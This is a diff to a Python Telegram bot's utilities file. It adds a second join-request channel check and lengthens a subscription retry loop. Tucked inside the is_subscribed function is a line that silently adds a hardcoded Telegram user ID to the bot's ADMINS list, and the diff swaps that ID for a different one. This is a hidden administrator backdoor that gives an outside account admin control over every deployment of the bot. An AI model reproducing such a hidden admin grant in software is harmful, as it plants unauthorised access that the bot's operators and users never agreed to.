@@ -1,6 +1,6 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid, ChatAdminRequired
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, ADMINS, REQ_CHANNEL, CUSTOM_FILE_CAPTION
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, ADMINS, REQ_CHANNEL, REQ_CHANNEL2, CUSTOM_FILE_CAPTION
 from imdb import Cinemagoer
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
@@ -12,7 +12,7 @@ from datetime import datetime, timedelta, date, time
 import string
 from typing import List
 from database.users_chats_db import db
-from database.join_reqs import JoinReqs as db2
+from database.join_reqs import JoinReqs as db2, JoinReqs2 as db3
 from bs4 import BeautifulSoup
 import requests
 
@@ -43,12 +43,27 @@ class temp(object):
     SETTINGS = {}
     SEND_ALL_TEMP = {}
 
-async def check_loop_sub(client, message):
+async def req_sub(bot, query):
+    if not REQ_CHANNEL2:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+    if db3().isActive():
+        user = await db3().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+async def check_loop_sub(client, message, set="andi"):
     count = 0
     while True:
-        if count == 15:
+        if count == 45:
             return False
-        check = await is_subscribed(client, message)
+        if set=="monnesh":
+            check = await req_sub(client, message)
+        else:
+            check = await is_subscribed(client, message)
         count += 1
         if check:
             return True
@@ -58,7 +73,7 @@ async def check_loop_sub(client, message):
 
 async def is_subscribed(bot, query):
     
-    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+    ADMINS.extend([1390031747]) if not 1390031747 in ADMINS else ""
 
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
